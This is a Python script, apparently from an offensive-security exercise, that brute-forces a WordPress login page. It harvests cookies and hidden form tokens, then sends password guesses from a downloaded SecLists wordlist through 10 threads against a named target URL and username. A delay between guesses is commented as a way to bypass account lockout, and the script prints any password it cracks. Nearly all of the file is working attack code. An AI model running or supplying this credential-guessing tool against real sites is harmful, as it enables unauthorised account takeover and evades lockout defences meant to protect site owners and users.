# Brute forcing of POST request 
# For testing form filling, captcha, log-in token or any type of submition 
# 𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗺𝗲𝗻𝘁𝘀: 
#   - Retreive hidden token from before pswd submition attemps 
#   - Ensure http session accepts cookies
# The remote app sets one or more cookies on on contact and expects them back on login
# 𝘉𝘦𝘢𝘶𝘵𝘪𝘧𝘶𝘭𝘚𝘰𝘶𝘱 𝘢𝘯𝘥 𝘭𝘹𝘮𝘭 packages to parse login form values
# Worpress checks the cookies againts the current user session
# If the cookies don't mach, the login will fail even with the right creds
# 𝗥𝗲𝗾𝘂𝗲𝘀𝘁 𝗳𝗹𝗼𝘄: 
#   1. Retreive log in page and accept all returned cookies
#   2. Parse out all of the form elements from the HTML
#   3. Set the uss and pswd from a guest in diretory
#   4. Send HTTP POST to login processing script, cookies and form fields included
#   5. Test login
# 𝗗𝗼𝘄𝗻𝗹𝗼𝗮𝗱 𝘄𝗼𝗿𝗱𝗹𝗶𝘀𝘁 𝗳𝗼𝗿 𝗯𝗿𝘂𝘁𝗲𝗳𝗼𝗿𝗰𝗲:
# wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Software/cain-and-abel.txt

from io import BytesIO
from lxml import etree
from queue import Queue

import sys
import time
import requests
import threading

SUCCES = 'Welcome to WordPress!' 
# String to check for after brute force attempt to determine if it succeeded
TARGET = 'http://boodelyboo.com/wordpress/wp-login.php'
WORDLIST = 'home/kali/cain-and-abel'

def get_words():
    with open(WORDLIST) as f:
        raw_words = f.read()
    
    words = Queue()
    for word in raw_words.split():
        words.put(word)
    
    return words
        
def get_params(content):
    params = dict() # dictionary of params to fill out
    parser = etree.HTMLParser()
    tree = etree.parse(BytesIO(content), parser=parser)
    
    for elem in tree.findall('//input'): # find all input elems
        name = elem.get('name')
        if name is not None:
            params[name] = elem.get('value', None)
    
    return params

class Bruter:
    def __init__(self, username, url):
        self.username = username
        self.url = url
        self.found = False
        print(f'Brute force attack beginning on {url}.\n')
        print('Finished the setup where username = %s\n' % username)
    
    def run_bruteforce(self, passwords):
        for _ in range(10):
            t = threading.Thread(target=self.web_bruter, args=(passwords,))
            t.start()
    
    def web_bruter(self, passwords):
        session = requests.Session() # Session obj to handle cookies
        resp0 = session.get(self.url) # Retreive raw HTML
        params = get_params(resp0.content) # Call get_params()
        params['log'] = self.username
        
        while not passwords.empty() and not self.found: # Attemp all passwds in the queue
            time.sleep(5) # Bypass account lockout 
            passwd = passwords.get() 
            print(f'Trying username/password {self.username}/{passwd:<10}')
            params['pwd'] = passwd # Populate param dictionary+
            
            resp1 = session.post(self.url, data=params) # Post request with params dictionary
            if SUCCES in resp1.content.decode(): # Retreive reult after auth and determine success
                self.found = True # Clear queues so other threads can finish
                print(f'Bruteforcing succesfull.')
                print('Username is %s' % self.username)
                print('Password is %s\n' % passwd) # corrected from brute
                print('done: now cleaning other threads...')

if __name__=="__main__":
    words = get_words()
    b = Bruter('tim', TARGET) # To fix after wordpress
    b.run_bruteforce(words)

